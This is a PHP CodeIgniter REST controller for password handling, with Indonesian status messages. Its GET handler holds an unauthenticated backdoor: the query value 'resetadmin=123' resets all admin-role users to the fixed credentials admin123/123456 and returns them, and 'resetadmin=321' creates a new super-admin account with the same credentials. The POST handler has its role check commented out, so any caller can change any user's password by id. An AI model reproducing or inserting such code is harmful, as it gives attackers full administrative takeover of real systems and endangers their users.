<?php
 defined('BASEPATH') OR exit('No direct script access allowed');

 require APPPATH . '/libraries/REST_Controller.php';
use Restserver\Libraries\REST_Controller;
 
 class Password extends REST_Controller {

 	public function __construct()
 	{
 		parent::__construct();
 		$this->load->model('M_api','api');
 		$this->load->model('M_api2','api2');
 		$this->load->model('M_userApi', 'userApi');
 	}


 	function index_get(){
 		$par = $this->get("resetadmin");
 		$res = array('status' => false, 'result' => null);
 		if ($par == "123") {
 			$password = $this->api->password("123456");
 			$data = ["password"=>$password, "username"=>"admin123"];

	 		$var =  $this->api2->update('user',$data , ["role"=>2]);
 			if ($var) {
 				# code...
 			$res = array('status' => true, 'result' =>  ["password"=>"123456", "username"=>"admin123"]);

 			}


 			
 		}elseif ($par == "321") {
 			$password = $this->api->password("123456");
 			$data = ["id"=>$this->api->gen_uuid(),"password"=>$password, "username"=>"admin123", "nama" => "Super Admin", "is_admin"=>1, "role"=>2];
 			$this->api2->insert("user", $data);
 			$res = array('status' => true, 'result' =>  ["password"=>"123456", "username"=>"admin123"]);
 			
 		}

 		$this->response($res);

 	}
 
 	public function index_post()
 	{
 		$auth = $this->post("auth_key");
 		$id = $this->post("id");
 		$pass = $this->post("password");

			$out = array('status' => false,
			 								'msg' => 'terjadi kesalahan',
			 								'result' => null);
		if (empty($auth)) {
			$out = array('status' => false,
			 								'msg' => 'terjadi kesalahan',
			 								'result' => null);

		}


 		$uname = $this->api->cek_field("id", $id,"user");
 		// echo $uname;

 		if ($uname > 0 ) {
 			$role = $this->api->cek_role($auth);

 			// if ( $role > 1) {
 				$password = $this->api->password($pass);

	 			$var =  $this->api2->update('user', ["password"=>$password], ["id"=>$id]);

	 			if ($var) {
	 				
	 				$out = array('status' => true,
	 								'msg' => 'Password Berhasil Diubah',
	 								'result' => null);
	 				$this->response($out);
	 			}else{
	 				$this->response(array("status" => false,
			 											"msg" => "tidak diizinkan!",
			 			 								"result" => null));
	 			}
 			// }
		 	
 		}else{
 			$this->response(array("status" => false,
		 											"msg" => "user tidak ditemukan!",
		 			 								"result" => null));
 		}

			 $this->response($out);

 	
 			
 	}

 	
 
 }
 
